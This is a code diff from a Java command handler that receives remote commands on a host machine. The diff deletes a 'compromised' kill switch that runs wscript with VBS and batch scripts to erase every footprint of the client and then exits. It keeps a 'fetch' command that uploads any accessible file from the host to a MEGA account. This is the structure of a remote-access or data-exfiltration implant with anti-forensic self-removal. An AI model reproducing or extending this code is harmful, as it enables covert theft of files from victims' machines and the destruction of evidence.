@@ -14,9 +14,6 @@ import lombok.extern.slf4j.Slf4j;
  * <br><br>
  * Commands:
  * <br>
- * <code>compromised</code> : Kill switch that removes all footprints of this client on host
- * machine, including the script performing the removal.
- * <br><br>
  * <code>fetch</code> : Upload any accessible file from this host machine to the configured MEGA
  * account.
  * <br>
@@ -79,19 +76,6 @@ public class CommandHandler {
           }
         }
         switch (command) {
-          case "compromised": {
-            log.info("Command Received: 'compromised'");
-            Runtime.getRuntime().exec(new String[]{
-                "wscript",
-                Constants.SCRIPTS_LOCATION + "\\background.vbs",
-                Constants.SCRIPTS_LOCATION + "\\compromised.bat"
-            });
-            synchronized (this.thread) {
-              this.thread.wait(100);
-            }
-            System.exit(0);
-            break;
-          }
           case "fetch": {
             String filePath = currCommand.substring(currCommand.indexOf(' ') + 1);
             if ("".equals(filePath) || !currCommand.contains(" ")) {
